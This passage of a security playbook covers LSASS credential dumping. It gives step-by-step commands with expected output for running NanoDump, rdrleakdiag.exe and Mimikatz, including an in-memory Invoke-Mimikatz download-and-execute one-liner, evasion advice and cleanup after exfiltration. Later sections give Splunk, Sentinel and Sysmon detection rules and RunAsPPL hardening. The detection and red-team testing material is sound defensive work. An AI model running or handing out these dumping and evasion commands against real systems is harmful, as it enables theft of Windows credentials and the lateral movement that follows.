- [Atomic Red Team T1003.001 #8](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-8---dump-lsassexe-memory-using-out-minidumpps1)

---

### METHOD 7: NanoDump (Syscalls + Invalid Signature Bypass)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 all builds. Advanced evasion technique using invalid dump signatures to bypass signature-based detection.

#### Step 1: Download NanoDump Executable
**Objective:** Obtain NanoDump from HelpSystems GitHub (fork of original Fortra project).

**Command (PowerShell):**
```powershell
$nanodumpURL = "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"
$outputPath = "C:\Windows\Temp\nanodump.exe"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $nanodumpURL -OutFile $outputPath
```

**Expected Output:**
```
C:\Windows\Temp\nanodump.exe (Size: ~150-200 KB)
```

#### Step 2: Execute NanoDump with Invalid Signature
**Objective:** Run NanoDump to create dump with invalid/modified dump signature to evade file-based detection.

**Command (Command Prompt - Admin):**
```cmd
C:\Windows\Temp\nanodump.exe -w "C:\Windows\Temp\nanodump.dmp"
```

**Command (PowerShell - Admin):**
```powershell
C:\Windows\Temp\nanodump.exe -w "C:\Windows\Temp\nanodump.dmp"
```

**Expected Output:**
```
[*] Creating process dump
[*] Dump written to C:\Windows\Temp\nanodump.dmp
[+] Success!
```

**What This Means:**
- `-w` flag specifies output file path.
- Dump signature is intentionally invalid, bypassing YARA rules and hash-based detection that look for standard MZ dump headers.
- File must be processed offline with Mimikatz or pypykatz using `sekurlsa::minidump` (which auto-corrects signature).

**OpSec & Evasion:**
- **Detection likelihood: VERY LOW** - Invalid signature evades file-based signatures; syscalls evade API hooking.
- **Post-Exploitation:**
  - Transfer dump file offline to isolated analysis system.
  - Use Mimikatz `sekurlsa::minidump` to analyze (Mimikatz automatically handles invalid signatures).

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "Access Denied" | Not running as admin | Run Command Prompt as Administrator |
| "File write failed" | Temp directory not writable | Use alternate path (C:\ProgramData, C:\temp) |
| "NanoDump: ntdll functions not found" | Corrupted binary or missing ntdll | Re-download NanoDump from GitHub |
| "PPL enabled - dump failed" | RunAsPPL = 2 (UEFI lock) | NanoDump still works with syscalls; if not, try kernel exploit |

**Command (Server 2022+ Variant - Silent Process Exit):**
```cmd
REM NanoDump can also leverage Silent Process Exit for even stealthier dumping
REM (Less detectable parent process, uses WerFault.exe)
C:\Windows\Temp\nanodump.exe --silent-process-exit "C:\Windows\Temp\"
```

**References & Proofs:**
- [Fortra NanoDump GitHub](https://github.com/fortra/nanodump)
- [Blog: NanoDump - Advanced LSASS Dumping Technique](https://blog.fortra.com/nanodump)
- [Atomic Red Team T1003.001 #4](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-4---dump-lsassexe-memory-using-nanodump)

---

### METHOD 8: rdrleakdiag.exe (Living-Off-The-Land LOLBin)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 all builds. Built-in Microsoft diagnostic tool; highly trusted and often bypasses security policies.

#### Step 1: Verify rdrleakdiag.exe Availability
**Objective:** Confirm the RDP Leak Diagnostic tool is present on the system.

**Command (PowerShell):**
```powershell
$rdrleakdiagPath = Get-ChildItem -Path "C:\Windows\System32", "C:\Windows\SysWOW64" -Filter "rdrleakdiag.exe" -ErrorAction SilentlyContinue
if ($rdrleakdiagPath) {
    Write-Host "[+] rdrleakdiag.exe found at: $($rdrleakdiagPath.FullName)"
} else {
    Write-Host "[-] rdrleakdiag.exe not found"
}
```

**Expected Output:**
```
[+] rdrleakdiag.exe found at: C:\Windows\System32\rdrleakdiag.exe
```

#### Step 2: Dump LSASS Using rdrleakdiag.exe
**Objective:** Use rdrleakdiag.exe to dump LSASS memory with `/p` (process) and `/fullmemdmp` (full memory dump) flags.

**Command (PowerShell - Admin):**
```powershell
$lsassPID = (Get-Process -Name lsass).Id
$outputDir = "C:\Windows\Temp\rdrleakdiag_output"

if (-not (Test-Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
}

& "C:\Windows\System32\rdrleakdiag.exe" /p $lsassPID /o $outputDir /fullmemdmp /wait 1

Write-Host "[+] Dump created in: $outputDir"
Get-ChildItem -Path $outputDir -Recurse -Filter "*.dmp"
```

**Expected Output:**
```
C:\Windows\System32\rdrleakdiag.exe /p 456 /o C:\Windows\Temp\rdrleakdiag_output /fullmemdmp /wait 1
[*] Creating dump...
[+] Minidump file created: C:\Windows\Temp\rdrleakdiag_output\minidump_456.dmp
```

**What This Means:**
- `/p [PID]`: Specifies process ID to dump.
- `/o [OUTPUT_DIR]`: Output directory for dump file.
- `/fullmemdmp`: Full memory dump (not mini-dump).
- `/wait 1`: Wait 1 second before creating dump.
- Output file: `minidump_[PID].dmp` (e.g., `minidump_456.dmp`).

**OpSec & Evasion:**
- **Detection likelihood: LOW-MEDIUM** - rdrleakdiag.exe is a trusted Microsoft tool; legitimate RDP diagnostics also use it. However, LSASS dumping is abnormal for this tool.
- **Evasion:**
  - Execute from background process to hide GUI (if any).
  - Delete output directory immediately after exfiltration.
  - Combine with process injection to avoid command-line logging.

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "rdrleakdiag.exe not found" | Not installed (rare; included in all modern Windows) | Tool is standard; ensure C:\Windows\System32 is accessible |
| "Access Denied" | Not running as admin | Run PowerShell as Administrator |
| "Output directory permission denied" | Cannot write to specified output directory | Use alternate path (C:\ProgramData, C:\temp) with full permissions |
| "Dump creation failed silently" | PPL or Credential Guard preventing access | rdrleakdiag may fail silently; check if output file exists and has size > 1 MB |

**Command (Server 2022+ Variant):**
```powershell
REM rdrleakdiag typically succeeds even on Server 2022+ with PPL
$lsassPID = (Get-Process -Name lsass).Id
$outputDir = "C:\Windows\Temp\rdrleakdiag_$((Get-Date).Ticks)"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
& "C:\Windows\System32\rdrleakdiag.exe" /p $lsassPID /o $outputDir /fullmemdmp /wait 1
```

**References & Proofs:**
- [Microsoft rdrleakdiag.exe Documentation](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/troubleshoot-remote-desktop-connections)
- [LOLBins Project - rdrleakdiag.exe](https://lolbas-project.github.io/lolbas/Binaries/Rdrleakdiag/)
- [Atomic Red Team T1003.001 #13](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-13---dump-lsassexe-using-lolbin-rdrleakdiagexe)

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

### Atomic Red Team Tests for T1003.001

The Atomic Red Team project provides 14 standardized tests for LSASS credential dumping:

| Test # | Test Name | Method | Tools Required | Supported Versions |
|---|---|---|---|---|
| 1 | Dump LSASS.exe Memory using ProcDump | Binary dump | procdump.exe | All |
| 2 | Dump LSASS.exe Memory using comsvcs.dll | LOLBin MiniDump | rundll32.exe (built-in) | All |
| 3 | Dump LSASS.exe Memory using direct system calls and API unhooking | Syscalls | Dumpert.exe | All (PPL-compatible) |
| 4 | Dump LSASS.exe Memory using NanoDump | Syscalls + Invalid Sig | nanodump.x64.exe | All (PPL-compatible) |
| 5 | Dump LSASS.exe Memory using Windows Task Manager | GUI | taskmgr.exe (built-in) | All |
| 6 | Offline Credential Theft With Mimikatz | File-based analysis | mimikatz.exe, .dmp file | All |
| 7 | LSASS read with pypykatz | File-based analysis | pypykatz (Python) | All |
| 8 | Dump LSASS.exe Memory using Out-Minidump.ps1 | PowerShell API wrapper | Out-Minidump.ps1 | All |
| 9 | Create Mini Dump of LSASS.exe using ProcDump | Mini-dump variant | procdump.exe | All |
| 10 | Powershell Mimikatz | In-memory injection | PowerShell, Invoke-Mimikatz | All |
| 11 | Dump LSASS with createdump.exe from .Net v5 | .NET tool | createdump.exe (.NET 5+) | All (if .NET 5+ installed) |
| 12 | Dump LSASS.exe using imported Microsoft DLLs | DLL import + XOR | xordump.exe | All |
| 13 | Dump LSASS.exe using lolbin rdrleakdiag.exe | LOLBin | rdrleakdiag.exe (built-in) | All |
| 14 | Dump LSASS.exe Memory through Silent Process Exit | WerFault.exe abuse | nanodump.exe (--silent-process-exit flag) | All |

### Running Atomic Red Team Tests

**Install Atomic Red Team (if not already installed):**
```powershell
# Download and import Atomic Red Team framework
$atomicRepoURL = "https://github.com/redcanaryco/atomic-red-team/archive/master.zip"
$extractPath = "C:\temp\atomic-red-team"

Invoke-WebRequest -Uri $atomicRepoURL -OutFile "C:\temp\atomic-red-team.zip"
Expand-Archive -Path "C:\temp\atomic-red-team.zip" -DestinationPath $extractPath -Force
```

**Execute T1003.001 Tests:**
```powershell
# Install Atomic Red Team PowerShell Module
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Install-AtomicRedTeam.ps1" -OutFile "$env:TEMP\Install-AtomicRedTeam.ps1"
& "$env:TEMP\Install-AtomicRedTeam.ps1" -getAtomics

# Run specific test (e.g., Test #1 - ProcDump)
Invoke-AtomicTest T1003.001 -TestNumbers 1

# Run all tests for T1003.001
Invoke-AtomicTest T1003.001

# Run test with cleanup
Invoke-AtomicTest T1003.001 -TestNumbers 2 -Cleanup
```

**Expected Output (Test #1 - ProcDump):**
```
Executing Atomic Test T1003.001.001 - Dump LSASS.exe Memory using ProcDump
[*] Test started at 2026-01-02 06:35:00
[+] procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
[+] Successfully dumped lsass.exe (45 MB) to C:\Windows\Temp\lsass_dump.dmp
[*] Test completed at 2026-01-02 06:35:02
```

### Cleanup After Testing
```powershell
# Remove dumped files
Remove-Item "C:\Windows\Temp\lsass*.dmp" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\dumpert.dmp" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\nanodump.dmp" -Force -ErrorAction SilentlyContinue
```

**Reference:** [Atomic Red Team T1003.001 Test Suite](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### [Mimikatz v2.2.0+](https://github.com/gentilkiwi/mimikatz)

**Current Version:** 2.2.0 (as of Jan 2026)
**Minimum Version:** 2.0.0 (legacy; recommend 2.2.0+ for modern OS support)
**Supported Platforms:** Windows Server 2008-2025, Windows XP-11
**Requirements:** Administrator or SYSTEM privileges, ntdll.dll access (user-mode library).

**Version-Specific Notes:**
- **v2.0.x** (2013-2015): Original LSASS dumping; no PPL bypass.
- **v2.1.x** (2015-2019): Added Credential Guard awareness; mimidrv.sys support for PPL bypass.
- **v2.2.0+** (2020-2026): Enhanced evasion, memory scanning improvements, direct syscall variants.

**Installation:**
```powershell
# Download from GitHub
$mimikatzURL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210101/mimikatz_trunk.zip"
$outputPath = "C:\Windows\Temp\mimikatz.zip"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $mimikatzURL -OutFile $outputPath
Expand-Archive -Path $outputPath -DestinationPath "C:\Windows\Temp\mimikatz" -Force

# Verify installation
C:\Windows\Temp\mimikatz\x64\mimikatz.exe
```

**Usage:**
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

**One-Liner (PowerShell):**
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```

---

### [Sysinternals ProcDump v10.0+](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)

**Current Version:** 10.15 (as of Jan 2026)
**Minimum Version:** 10.0
**Supported Platforms:** Windows XP-11, Server 2003-2025
**Requirements:** Administrator privileges, minimal system resources.

**Installation:**
```powershell
# Download from Microsoft Sysinternals
$procDumpURL = "https://download.sysinternals.com/files/Procdump.zip"
$outputPath = "C:\Windows\Temp\Procdump.zip"

Invoke-WebRequest -Uri $procDumpURL -OutFile $outputPath
Expand-Archive -Path $outputPath -DestinationPath "C:\Windows\Temp\Procdump" -Force
```

**Usage:**
```cmd
procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
procdump64.exe -accepteula -mm lsass.exe C:\Windows\Temp\lsass_minidump.dmp  # Mini-dump variant
```

---

### [Dumpert (Outflank)](https://github.com/outflanknl/Dumpert)

**Current Version:** Latest (actively maintained)
**Minimum Version:** Latest (no older versions maintained)
**Supported Platforms:** Windows Server 2016-2025, Windows 10/11
**Requirements:** Administrator privileges, ntdll.dll access, direct syscall capability.

**Installation:**
```powershell
$dumpertURL = "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe"
$outputPath = "C:\Windows\Temp\Dumpert.exe"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $dumpertURL -OutFile $outputPath
```

**Usage:**
```cmd
Dumpert.exe
REM Output: C:\Windows\Temp\dumpert.dmp
```

---

### [NanoDump (Fortra)](https://github.com/fortra/nanodump)

**Current Version:** Latest (actively maintained)
**Minimum Version:** Latest
**Supported Platforms:** Windows Server 2016-2025, Windows 10/11 all builds
**Requirements:** Administrator privileges, ntdll.dll access, direct syscall capability.

**Installation:**
```powershell
$nanodumpURL = "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"
$outputPath = "C:\Windows\Temp\nanodump.exe"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $nanodumpURL -OutFile $outputPath
```

**Usage:**
```cmd
nanodump.exe -w "C:\Windows\Temp\nanodump.dmp"
nanodump.exe --silent-process-exit "C:\Windows\Temp\"  # Silent Process Exit variant
```

---

### [pypykatz (Python)](https://github.com/skelsec/pypykatz)

**Current Version:** Latest (actively maintained)
**Minimum Version:** Latest
**Supported Platforms:** Windows, Linux, macOS (for offline dump analysis)
**Requirements:** Python 3.6+, dumped LSASS .dmp file.

**Installation:**
```powershell
# Install Python 3 first, then:
pip install pypykatz
```

**Usage:**
```bash
# Live LSASS parsing (Windows only)
pypykatz live lsa

# Offline dump analysis (any platform)
pypykatz minidump <path_to_lsass.dmp>
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: High-Frequency Process Memory Access to LSASS

**Rule Configuration:**
- **Required Index:** main (or custom Windows event index)
- **Required Sourcetype:** WinEventLog:Security, WinEventLog:Sysmon
- **Required Fields:** EventCode, TargetImage, SourceImage, AccessMask
- **Alert Threshold:** > 3 occurrences of process accessing LSASS with access mask 0x1010 or 0x1410 in 5 minutes.
- **Applies To Versions:** Windows Server 2016-2025, Windows 10/11

**SPL Query:**
```spl
sourcetype=WinEventLog:Sysmon EventCode=10 TargetImage="*lsass.exe" (AccessMask=0x1010 OR AccessMask=0x1410 OR AccessMask=0x1F0FFF)
| stats count by SourceImage, SourceUser, AccessMask
| where count >= 3
```

**What This Detects:**
- **EventCode=10**: Sysmon ProcessAccess event (process attempting to open handle to another process).
- **TargetImage**: Target process is LSASS.exe.
- **AccessMask**: Suspicious access flags (0x1010 = PROCESS_QUERY_INFORMATION + PROCESS_VM_READ; 0x1410 = additional flags; 0x1F0FFF = full access).
- **Anomaly:** Multiple suspicious processes accessing LSASS within short time window = likely credential dumping attempt.

**Manual Configuration Steps (Splunk Web):**
1. Navigate to **Splunk Home** → **Search & Reporting**.
2. Click **+ New** → **Search**.
3. Paste the SPL query above.
4. Click **Search** to test.
5. Once validated, click **Save** → **Save as Alert**.
6. Configure:
   - **Name:** "Suspicious LSASS Process Access - Credential Dumping"
   - **Search type:** Scheduled
   - **Run every:** 5 minutes
   - **Time range:** Last 5 minutes
7. **Add Trigger Condition:** `Search Condition: >0`
8. **Add Action:** Email to SOC or Slack webhook.

**False Positive Analysis:**
- **Legitimate Activity:** Windows Defender, Splunk Universal Forwarder, Microsoft Endpoint Manager accessing LSASS for telemetry.
- **Benign Tools:** Sysinternals tools (WinDbg, Process Explorer) legitimately access LSASS with higher privileges.
- **Tuning:** Exclude known-safe parent processes: `| where SourceImage NOT IN ("C:\\Program Files\\*\\MsMpEng.exe", "C:\\Windows\\Temp\\*")`

**Source:** [Splunk Blog - Hunting LSASS Access](https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html)

---

### Rule 2: Suspicious Parent Process Dumping LSASS

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** ParentImage, Image, CommandLine
- **Alert Threshold:** Any occurrence of high-risk parent processes (rundll32.exe, taskmgr.exe, comsvcs.dll) dumping LSASS.
- **Applies To Versions:** Windows Server 2016-2025, Windows 10/11

**SPL Query:**
```spl
sourcetype=WinEventLog:Security EventCode=4688 (ParentImage="*\\rundll32.exe" OR ParentImage="*\\taskmgr.exe" OR ParentImage="*\\comsvcs.dll")
(CommandLine="*MiniDump*" OR CommandLine="*lsass*" OR CommandLine="*procdump*")
| stats count by ParentImage, User, CommandLine
```

**What This Detects:**
- **EventCode=4688**: Process creation event.
- **ParentImage:** Parent process is rundll32.exe, taskmgr.exe, or comsvcs.dll (LOLBins commonly used for LSASS dumping).
- **CommandLine:** Contains keyword "MiniDump," "lsass," or "procdump" (indicative of credential dumping).
- **Alert:** High-risk combination suggests active LSASS dumping attack.

**Manual Configuration Steps:**
1. Navigate to **Splunk** → **Alerts** → **Create Alert**.
2. Paste SPL query above.
3. Configure:
   - **Name:** "Suspicious LOLBin LSASS Dumping Activity"
   - **Run every:** 1 minute
   - **Time range:** Last 10 minutes
4. **Trigger:** `Search condition: count >= 1`
5. **Actions:** Send alert to SOC email.

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: LSASS Process Memory Dump Attempt (Sysmon-based)

**Rule Configuration:**
- **Required Table:** SecurityEvent (Windows Event Log), Sysmon events
- **Required Fields:** EventID, TargetProcessName, AccessMask, SourceProcessName
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** Windows Server 2016-2025, Windows 10/11 (requires Sysmon)

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 10  // Sysmon ProcessAccess
| where TargetProcessName endswith "lsass.exe"
| where AccessMask in ("0x1010", "0x1410", "0x1F0FFF")  // Suspicious access masks
| summarize AccessCount = count() by SourceProcessName, SourceUserName, TargetProcessName
| where AccessCount >= 3
| project TimeGenerated, SourceProcessName, SourceUserName, AccessCount
```

**What This Detects:**
- **EventID 10**: Sysmon ProcessAccess event (process opening handle to LSASS).
- **TargetProcessName:** Target is lsass.exe.
- **AccessMask:** Suspicious masks (0x1010 = PROCESS_QUERY_INFORMATION + PROCESS_VM_READ; full access = 0x1F0FFF).
- **Aggregation:** > 3 accesses = likely dumping attempt (tools typically retry multiple times if first attempt fails).

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**.
2. Click **+ Create** → **Scheduled query rule**.
3. **General Tab:**
   - **Name:** `Suspicious LSASS Memory Access - Credential Dumping Attempt`
   - **Description:** Detects processes attempting to dump LSASS memory with suspicious access masks.
   - **Tactics:** Credential Access
   - **Techniques:** T1003.001
   - **Severity:** High
4. **Set rule logic Tab:**
   - Paste KQL query above.
   - **Run query every:** 5 minutes
   - **Lookup data from the last:** 30 minutes
5. **Incident settings:**
   - **Create incidents from alerts triggered by this analytics rule:** Enabled
   - **Group related alerts into incidents:** Enabled
   - **Incident name format:** Dynamic (auto)
6. Click **Review + create** → **Create**.

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

$query = @"
SecurityEvent
| where EventID == 10
| where TargetProcessName endswith "lsass.exe"
| where AccessMask in ("0x1010", "0x1410", "0x1F0FFF")
| summarize AccessCount = count() by SourceProcessName, SourceUserName
| where AccessCount >= 3
"@

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Suspicious LSASS Memory Access" `
  -Query $query `
  -Severity "High" `
  -Enabled $true `
  -TriggerOperator "GreaterThan" `
  -TriggerThreshold 0
```

---

### Query 2: LSASS Dump via LOLBin (Command-Line Pattern Matching)

**Rule Configuration:**
- **Required Table:** SecurityEvent (EventID 4688 - Process Creation)
- **Required Fields:** CommandLine, ParentProcessName, SubjectUserName
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes
- **Applies To Versions:** Windows Server 2016-2025, Windows 10/11

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688  // Process Creation
| where CommandLine contains "MiniDump" or CommandLine contains "lsass" or CommandLine contains "Invoke-Mimikatz"
| where ParentProcessName in ("rundll32.exe", "taskmgr.exe", "powershell.exe", "cmd.exe")
| project TimeGenerated, CommandLine, ParentProcessName, SubjectUserName, Computer
| summarize count() by ParentProcessName, SubjectUserName
```

**What This Detects:**
- **EventID 4688:** Process creation event.
- **CommandLine:** Contains suspicious keywords ("MiniDump", "lsass", "Invoke-Mimikatz", "sekurlsa").
- **ParentProcess:** Suspicious parent (rundll32.exe dumping via comsvcs.dll, taskmgr.exe, PowerShell executing Mimikatz, etc.).
- **Alert:** Any match = LSASS dumping attempt in progress.

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4656 - Handle to an Object Was Requested**
- **Log Source:** Security
- **Trigger:** A process attempts to open a handle to LSASS with specific access permissions.
- **Filter:** Object Name contains "lsass.exe", Access Mask = 0x1010, 0x1410, or 0x1F0FFF.
- **Applies To Versions:** Windows Server 2016-2025, Windows 10/11

**Event ID: 4663 - An Attempt Was Made to Access an Object**
- **Log Source:** Security
- **Trigger:** Successful access to object (LSASS) by a process.
- **Filter:** Object Name contains "lsass.exe", Access Type = Read/Query.
- **Applies To Versions:** Windows Server 2016-2025, Windows 10/11

**Event ID: 4688 - A New Process Has Been Created**
- **Log Source:** Security
- **Trigger:** New process created (parent = rundll32.exe, cmd.exe, PowerShell, etc.).
- **Filter:** CommandLine contains "MiniDump", "lsass", "Invoke-Mimikatz", "procdump", "dumpert", "nanodump".
- **Applies To Versions:** Windows Server 2016-2025, Windows 10/11

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc).
2. Create or edit a GPO for your domain.
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**.
4. Double-click **Audit Handle Manipulation**.
5. Enable **Success** and **Failure**.
6. Apply GPO: `gpupdate /force` on target machines.

**Manual Configuration Steps (Local Policy - Server 2022+):**
1. Open **Local Security Policy** (secpol.msc).
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Object Access**.
3. Enable **Audit Handle Manipulation** (Success + Failure).
4. Restart machine or run: `auditpol /set /subcategory:"Handle Manipulation" /success:enable /failure:enable`

**Verification Command:**
```powershell
auditpol /get /subcategory:"Handle Manipulation"
REM Expected output: Success and Failure: Enabled
```

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+ (for enhanced LSASS protection features)
**Supported Platforms:** Windows Server 2016-2025, Windows 10/11

```xml
<Sysmon schemaversion="4.30">
  <!-- Detect ProcessAccess to LSASS.exe -->
  <RuleGroup name="LSASS Memory Dump Detection" groupRelation="or">
    <ProcessAccess onmatch="include">
      <!-- Target: lsass.exe -->
      <TargetImage condition="image">lsass.exe</TargetImage>
      <!-- Suspicious access masks (credentials dumping) -->
      <AccessMask condition="is">0x1010</AccessMask>
      <!-- Or full access -->
      <AccessMask condition="is">0x1F0FFF</AccessMask>
      <!-- Suspicious source processes (exclude known-safe) -->
      <SourceImage condition="is not">C:\Program Files\Microsoft\Exchange Server\V15\Bin\ExchangeProvider.dll</SourceImage>
    </ProcessAccess>
  </RuleGroup>

  <!-- Detect command-line execution with LSASS dumping keywords -->
  <RuleGroup name="LSASS Dumping Keyword Detection" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">Invoke-Mimikatz</CommandLine>
      <CommandLine condition="contains">sekurlsa</CommandLine>
      <CommandLine condition="contains">MiniDump</CommandLine>
      <CommandLine condition="contains">procdump</CommandLine>
      <CommandLine condition="contains">lsass.dmp</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Detect file creation of dumps -->
  <RuleGroup name="LSASS Dump File Creation" groupRelation="or">
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">lsass</TargetFilename>
      <TargetFilename condition="ends with">.dmp</TargetFilename>
      <TargetFilename condition="ends with">dumpert.dmp</TargetFilename>
      <TargetFilename condition="ends with">nanodump.dmp</TargetFilename>
    </FileCreate>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download latest Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).
2. Create `sysmon-config.xml` with the XML above.
3. Install Sysmon with config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```
5. Monitor Event 10 (ProcessAccess) and Event 1 (ProcessCreate) for LSASS activity.

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious LSASS Memory Access

**Alert Name:** "Suspicious Process Memory Dumping Detected"
- **Severity:** Critical
- **Description:** Microsoft Defender for Cloud detects attempts to access LSASS process memory using tools like Mimikatz, ProcDump, or native APIs.
- **Applies To:** All subscriptions with Defender for Servers Plan 2 enabled.
- **Remediation:** 
  1. Immediately isolate affected system from network.
  2. Review process execution history and access logs.
  3. Reset all compromised user credentials.
  4. Scan for additional persistence mechanisms (backdoors, scheduled tasks).

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**.
2. Go to **Environment settings** (left sidebar).
3. Select your **Subscription**.
4. Under **Defender plans**, enable:
   - **Defender for Servers:** ON (Plan 2 recommended for LSASS detection).
   - **Defender for Identity:** ON (detects Kerberos attacks post-dump).
5. Click **Save**.
6. Navigate to **Security alerts** to view triggered alerts.
7. Review affected resources and implement remediation steps.

**Built-in Rules Covering LSASS Dumping:**
- **Rule:** "Suspicious Process Memory Read/Write"
  - Detects unusual process memory access patterns.
  - Uses behavior-based analysis + machine learning.
  
- **Rule:** "LSASS Memory Dump Attempt"
  - Specific detection for LSASS process dumping.
  - Triggers on access masks 0x1010, 0x1410.

- **Rule:** "Credential Dumping Tool Execution"
  - Detects execution of Mimikatz, ProcDump, and similar tools.
  - Hash-based + behavioral detection.

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Operation Query: Credential Access

**PowerShell Command:**
```powershell
# Connect to Security & Compliance PowerShell
Connect-IPPSSession

# Search for suspicious LSASS-related activities
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -FreeText "lsass" | Select-Object -First 100
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -Operations "DumpLSASS", "CredentialAccess"
```

**Operation:** CredentialAccess (if logged via M365 APIs)
**Workload:** AzureActiveDirectory, ExchangeOnline
**Details to Analyze:** 
  - **CreationTime:** When the access occurred.
  - **UserIds:** Which user/service account triggered access.
  - **Operations:** Specific API calls (GetCredentials, DumpMemory, etc.).
  - **AuditData:** JSON blob containing detailed parameters.

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com).
2. Click **Audit** (left sidebar).
3. If not enabled, click **Turn on auditing** (required for M365 E3+).
4. Wait 24+ hours for initial data population.

**Manual Configuration Steps (Search Audit Logs):**
1. Go to **Audit** → **New search**.
2. Set **Date range** (e.g., Last 7 days).
3. Under **Activities**, search for: "credential" or "dump" or "lsass".
4. Under **Users**, leave blank or enter specific user/service account UPNs.
5. Click **Search**.
6. Review results and export to CSV: **Export** → **Download all results**.

**PowerShell Extraction:**
```powershell
$auditLogs = Search-UnifiedAuditLog -StartDate "2026-01-02" -EndDate "2026-01-09" -FreeText "lsass"
$auditLogs | Export-Csv -Path "C:\Audit_Logs.csv" -NoTypeInformation
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Mitigation 1: Enable LSA Protection (RunAsPPL)

**Objective:** Prevent user-mode LSASS dumping by protecting LSASS.exe as a Protected Process Light (PPL).

**Applies To Versions:** 
- Server 2016-2019: Optional (RunAsPPL = 0 by default)
- Server 2022: Increasingly enabled (RunAsPPL = 1 recommended)
- Server 2025: Default (RunAsPPL = 2 with UEFI lock for enterprise-joined)

**Manual Steps (Registry - PowerShell):**
```powershell
# Enable LSA Protection (UEFI Secure Boot required for full protection)
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -PropertyType DWord -Force
Write-Host "[+] LSA Protection enabled (RunAsPPL = 1)"

# Verify setting
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
REM Expected: RunAsPPL : 1 (no UEFI lock) or 2 (with UEFI lock)

# Restart system for change to take effect
Restart-Computer -Force
```

**Manual Steps (Group Policy - Server 2022+):**
1. Open **gpmc.msc** (Group Policy Management Console).
